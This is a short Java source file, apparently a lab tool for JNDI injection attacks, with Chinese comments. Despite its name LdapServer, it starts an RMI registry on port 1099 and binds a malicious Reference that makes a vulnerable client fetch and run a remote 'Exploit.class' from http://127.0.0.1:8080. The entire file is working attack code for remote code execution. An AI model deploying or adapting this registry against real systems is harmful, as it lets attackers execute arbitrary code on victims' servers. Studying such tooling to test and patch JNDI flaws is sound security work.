import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class LdapServer {

    static {

        // See . https://mp.weixin.qq.com/s/4FZX-S3iUusH5sCXW-AqtQ
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        // 或者在java命令行内执行 加上 -Djava.rmi.server.hostname=127.0.0.1
    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        Registry registry = LocateRegistry.createRegistry(1099);

        // 关键代码
        String remoteClassServer = "http://127.0.0.1:8080/Exploit.class";
        Reference reference = new Reference("Exploit", "Exploit", remoteClassServer);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("test", referenceWrapper);
    }
}
